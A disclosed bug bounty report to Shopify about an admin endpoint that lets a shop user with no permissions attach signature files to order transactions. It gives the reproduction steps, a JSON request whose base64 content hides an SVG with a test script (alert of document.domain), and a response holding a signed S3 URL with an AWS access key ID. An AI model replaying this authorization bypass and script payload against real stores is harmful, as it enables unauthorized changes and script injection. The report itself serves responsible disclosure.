# Add signature to transactions without any permission

## Report Details
- **Report ID**: 172733
- **URL**: https://hackerone.com/reports/172733
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-28T19:20:59.667Z
- **Disclosed**: 2016-10-07T02:59:27.911Z

## Reporter
- **Username**: supernatural
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

I found an endpoint for transaction signing
but user permission not checked on this endpoint
So an user without any permission in shop can add signature to transactions!


Endpoint: `/admin/secure_files.json`
Parameters:

````
{"secure_file":{"filetype":"svg","content":"PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBiYXNlUHJvZmlsZT0iZnVsbCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4gIA0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoZG9jdW1lbnQuZG9tYWluKTsNCiAgIDwvc2NyaXB0Pg0KPC9zdmc+","type":"signatures","order_transaction_id":"__Transaction_ID__"}}
````


Just fill `__Transaction_ID__`  in *order_transaction_id* and send request as user without permission
Response will be like this
````
{
  "secure_file": {
    "url": "https://shopify.s3.amazonaws.com/s/files/1/0917/1436/signatures/2e990586-6721-448a-a891-025471d6b2fe.svg?AWSAccessKeyId=AKIAJYM555KVYEWGJDKQ&Expires=1475694450&Signature=DmF7008ou7nn22ypD5Iyq%2BKomMQ%3D"
  }
}
````
when you back to order page or `/admin/orders/_order_id_/transaction.json`
signature file will be shown!

This should be limited to users who have access to transaction/order section!


Regards



## Attachments
No attachments
